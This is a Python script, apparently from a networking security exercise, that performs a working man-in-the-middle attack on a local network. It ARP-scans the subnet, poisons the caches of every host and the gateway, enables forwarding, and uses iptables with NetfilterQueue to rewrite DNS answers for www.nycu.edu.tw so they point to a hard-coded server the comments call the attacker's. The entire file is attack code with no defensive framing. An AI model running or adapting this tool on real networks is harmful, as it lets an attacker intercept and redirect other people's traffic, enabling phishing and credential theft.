#!/usr/bin/env python3
import scapy.all as scapy
import netifaces as ni
import sys
import subprocess
import math
from netfilterqueue import NetfilterQueue

def get_network_info():
    gateway_ip = ni.gateways()["default"][ni.AF_INET][0]
    interface = ni.gateways()["default"][ni.AF_INET][1]
    mask = ni.ifaddresses(interface)[ni.AF_INET][0]["netmask"]
    cidr = 32
    for i in mask.split('.'):
        cidr -= int(math.log2(256-int(i)))
    return gateway_ip, cidr


def scanning(network):
    global scan
    scan = {}
    request = scapy.ARP(pdst=network)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    request_broadcast = broadcast / request
    answer = scapy.srp(request_broadcast, timeout=3, verbose=False)[0]
    for send, receive in answer:
        scan[receive.psrc] = receive.hwsrc

def print_available_devices(gateway_ip):
    print("Available devices")
    print("-------------------------------------")
    print("IP                MAC                ")
    print("-------------------------------------")
    for key, value in scan.items():
        if key != gateway_ip:
            print("%-17s %17s" % (key, value))

def spoof(target_ip, spoof_ip):
    global scan
    target_mac = scan[target_ip]
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False) 

def callback(packet):
    # convert the NetfilterQueue packet into scapy packet for processing the packet
    scapyPacket = scapy.IP(packet.get_payload()) 
    qname = scapyPacket[scapy.DNSQR].qname
    if qname == b'www.nycu.edu.tw.':
        # modify the packet ancount with 1, as we are sent a single DNSRR to the victim.
        scapyPacket[scapy.DNS].ancount = 1
        scapyPacket[scapy.DNS].an = scapy.DNSRR(rrname = 'www.nycu.edu.tw',
                                                rdata = '140.113.207.241') # attacker server IP in the DNS spoofing
        # packet corruption can be detected using the checksum and other information, so delete them
        del scapyPacket[scapy.IP].len
        del scapyPacket[scapy.IP].chksum
        del scapyPacket[scapy.UDP].len
        del scapyPacket[scapy.UDP].chksum

        # set the modified scapy packet payload to the NetfilterQueue packet
        packet.set_payload(bytes(scapyPacket))
    # packet is ready to be sent to the victim
    packet.accept()

def restore(dst_ip, src_ip):
    dst_mac = scan[dst_ip]
    src_mac = scan[src_ip]
    packet = scapy.ARP(
            op = 2,
            pdst=dst_ip,
            hwdst = dst_mac,
            psrc = src_ip,
            hwsrc = src_mac
            )
    scapy.send(packet, verbose=False)

def main():
    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    gateway_ip, cidr = get_network_info()
    network = gateway_ip + "/" + str(cidr)
    scanning(network)
    print_available_devices(gateway_ip)

    print("ARP spoofing...")
    for ip in scan.keys():
        spoof(ip, gateway_ip)
        spoof(gateway_ip, ip)

    # insert this rule into the IP table, so that the packets will be redirected to NetfilterQuque
    subprocess.run("sudo iptables -I FORWARD -j NFQUEUE --queue-num 17 -p udp --sport 53", shell=True)
    subprocess.run("sudo iptables -I FORWARD -j REJECT -p tcp --sport 53", shell=True)
    queue = NetfilterQueue()
    # bind the queue object to the queue number and a call back function
    # the callBack function will be called when a new packet enters the queue
    queue.bind(17, callback)
    try:
        queue.run()
    except KeyboardInterrupt:
        print("\nkeyboard interrupt........Exiting")
        subprocess.run("iptables --flush", shell=True)
        for ip in scan.keys():
            if ip != gateway_ip:
                restore(gateway_ip, ip)
                restore(ip, gateway_ip)
        sys.exit()


if __name__ == "__main__":
    main()